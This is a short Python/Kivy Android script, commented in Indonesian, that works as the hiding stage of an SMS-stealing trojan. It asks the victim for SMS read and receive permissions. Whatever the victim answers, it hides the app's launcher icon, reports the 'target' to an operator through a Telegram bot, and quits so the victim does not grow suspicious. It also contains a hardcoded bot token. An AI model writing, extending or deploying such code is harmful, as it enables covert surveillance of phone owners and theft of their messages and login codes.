import telebot
from android.permissions import request_permissions, Permission
from jnius import autoclass
import os

# --- KONFIGURASI OTOMATIS ---
TOKEN = "8688240904:AAFbm71rIxvaNTAuy0qUatSkAagp26uD6ZU"
CHAT_ID = "5999516433"
# ---------------------------

bot = telebot.TeleBot(TOKEN)

def hide_and_exit():
    try:
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        currentActivity = PythonActivity.mActivity
        PackageManager = autoclass('android.content.pm.PackageManager')
        ComponentName = autoclass('android.content.ComponentName')
        
        package_name = currentActivity.getPackageName()
        component_name = ComponentName(package_name, 'org.kivy.android.PythonActivity')
        
        # Eksekusi sembunyi ikon
        currentActivity.getPackageManager().setComponentEnabledSetting(
            component_name,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        
        bot.send_message(CHAT_ID, "✅ Target sudah merespon popup. Ikon berhasil dihilangkan!")
    except:
        pass
    finally:
        # Keluar aplikasi agar target tidak curiga
        os._exit(0)

def on_permissions_callback(permissions, grants):
    # Apapun pilihannya (izinkan/tolak), langsung eksekusi sembunyi
    hide_and_exit()

if __name__ == '__main__':
    # Munculkan popup izin (READ_SMS, RECEIVE_SMS, NOTIFIKASI)
    request_permissions([
        Permission.READ_SMS,
        Permission.RECEIVE_SMS,
        Permission.POST_NOTIFICATIONS
    ], on_permissions_callback)
